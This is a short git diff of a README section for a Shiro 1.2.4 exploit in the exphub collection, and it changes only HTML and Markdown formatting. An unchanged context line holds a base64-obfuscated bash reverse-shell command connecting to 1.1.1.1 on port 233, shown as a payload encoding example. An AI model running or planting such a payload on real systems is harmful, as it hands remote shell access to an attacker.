@@ -3,8 +3,7 @@ Apache Shiro
 
 
 <details>
-<summary>Shiro 1.2.4 [点击展开]</summary>
-<pre><code>
+<summary>Shiro 1.2.4 [点击展开] </summary>
 ```
 +-------------------------------------------------------------------------------------------------------+
 + DES: By zhzyker as https://github.com/zhzyker/exphub                                                  +
@@ -33,10 +32,8 @@ Encoding：
 bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}
 ```
 
-利用示例：
+利用示例：  
 ![images](https://github.com/zhzyker/exphub/tree/master/shiro/image/1.gif)
 ![images](https://github.com/zhzyker/exphub/tree/master/shiro/image/2.gif)
 
-
-</code></pre>
 </details>
